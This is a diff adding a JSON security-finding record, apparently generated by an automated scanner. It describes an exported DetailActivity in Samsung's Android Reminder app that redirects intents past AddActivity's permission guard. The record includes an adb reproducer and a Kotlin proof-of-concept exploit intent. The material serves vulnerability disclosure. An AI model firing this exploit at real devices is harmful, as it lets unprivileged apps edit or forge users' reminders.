@@ -1,0 +1,50 @@
+{
+  "id": "FND-2026-04-29-A03",
+  "report_id": "RPT-2026-04-29-SR",
+  "project": "samsung-reminder",
+  "domain": "android",
+  "category": "exposed-component-confused-deputy",
+  "severity": "high",
+  "title": "DetailActivity Permission-Bypass via Intent Redirection to AddActivity",
+  "agent": "deeplink-tracker-v0.1",
+  "discovered_at": "2026-04-29T09:00:00Z",
+  "target": {
+    "package": "com.samsung.android.app.reminder",
+    "version_name": "unknown",
+    "build_type": "release",
+    "component_type": "activity",
+    "component_class": "com.samsung.android.app.reminder.ui.detail.view.DetailActivity",
+    "exported": true,
+    "permission_required": null,
+    "intent_filter": {
+      "actions": [
+        "android.intent.action.VIEW",
+        "com.samsung.android.app.reminder.action.ReminderDetailView"
+      ],
+      "categories": [
+        "android.intent.category.DEFAULT"
+      ],
+      "data_schemes": [
+        "uuid",
+        "reminder",
+        "content"
+      ],
+      "data_hosts": [
+        "reminder.uuid",
+        "viewdetail",
+        "@string/string_detail_view_host_name"
+      ]
+    },
+    "deeplink_example": "uuid://reminder.uuid/11111111-2222-3333-4444-555555555555"
+  },
+  "evidence": {
+    "manifest_excerpt": "<activity\n    android:name=\"com.samsung.android.app.reminder.ui.detail.view.DetailActivity\"\n    android:exported=\"true\">\n  <intent-filter>\n    <action android:name=\"android.intent.action.VIEW\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"uuid\" android:host=\"reminder.uuid\"/>\n  </intent-filter>\n  <intent-filter>\n    <action android:name=\"com.samsung.android.app.reminder.action.ReminderDetailView\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"reminder\" android:host=\"viewdetail\"/>\n  </intent-filter>\n  <intent-filter>\n    <action android:name=\"android.intent.action.VIEW\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"content\" android:host=\"@string/string_detail_view_host_name\"/>\n  </intent-filter>\n</activity>\n\n<activity\n    android:name=\"com.samsung.android.app.reminder.ui.detail.add.AddActivity\"\n    android:permission=\"com.samsung.android.app.reminder.permission.action.REGISTER\"\n    android:exported=\"true\"/>",
+    "code_excerpt": "// DetailActivity.java (decompiled, lines 43-107)\nString stringExtra = getIntent().getStringExtra(\"uuid\");\nif (stringExtra == null && getIntent().getData() != null) {\n    stringExtra = getIntent().getData().getLastPathSegment();\n    if (stringExtra == null) {\n        stringExtra = getIntent().getData().getQueryParameter(\"uuid\");\n    }\n}\n\nIntent intent = getIntent();\nintent.setClass(getApplicationContext(), AddActivity.class);\nintent.putExtra(\"add_view_type\", ...);\nintent.putExtra(\"uuid\", stringExtra);\nintent.putExtra(\"viewDetailFromCalendar\", booleanExtra);\nintent.putExtra(\"viewDetailFromNowBrief\", booleanExtra2);\n\nif (zD || zD2) {\n    setIntent(y0.a(getApplicationContext(), getIntent()));\n    getApplicationContext().startActivity(getIntent());\n} else {\n    y0.k(this, intent);\n}",
+    "intent_reproducer": "adb shell am start -W -a android.intent.action.VIEW \\\n  -d 'uuid://reminder.uuid/11111111-2222-3333-4444-555555555555' \\\n  -n com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity \\\n  --ei add_view_type 2 \\\n  --es uuid 11111111-2222-3333-4444-555555555555",
+    "poc_kotlin": "val victimUuid = \"11111111-2222-3333-4444-555555555555\"\nval exploit = Intent(Intent.ACTION_VIEW).apply {\n    setClassName(\n        \"com.samsung.android.app.reminder\",\n        \"com.samsung.android.app.reminder.ui.detail.view.DetailActivity\"\n    )\n    data = Uri.parse(\"uuid://reminder.uuid/$victimUuid\")\n    putExtra(\"uuid\", victimUuid)\n    putExtra(\"add_view_type\", 2)\n    putExtra(\"viewDetailFromCalendar\", true)\n    addFlags(\n        Intent.FLAG_ACTIVITY_NEW_TASK or\n        Intent.FLAG_GRANT_READ_URI_PERMISSION or\n        Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n    )\n}\nstartActivity(exploit)"
+  },
+  "ai_confidence": 0.9,
+  "ai_rationale": "DetailActivity는 android:exported=true이고 permission 미지정 상태로 세 종류의 deeplink intent-filter (uuid://, reminder://viewdetail, content://...)에 노출됨. onCreate에서 getIntent()를 그대로 보존한 채 setClass(ctx, AddActivity.class)로 컴포넌트만 갈아끼우고 startActivity를 호출하기 때문에 AddActivity의 android:permission=\"...REGISTER\" 가드가 우회됨 (classic confused-deputy / permission re-delegation). 공격자 제어 extras (add_view_type, uuid, viewDetailFromCalendar, FLAG_GRANT_READ/WRITE_URI_PERMISSION, ClipData)가 모두 보존되어 다운스트림 sink (V-006 scan-reminder, V-009 pending_data parseUri, V-010 Serializable, V-011 self-embed)로 흘러들어감. 권한 없는 3rd-party 앱이 임의 reminder를 EDIT 모드로 띄우거나 phishing reminder를 생성 가능.",
+  "cwe": "CWE-441",
+  "cve": null
+}
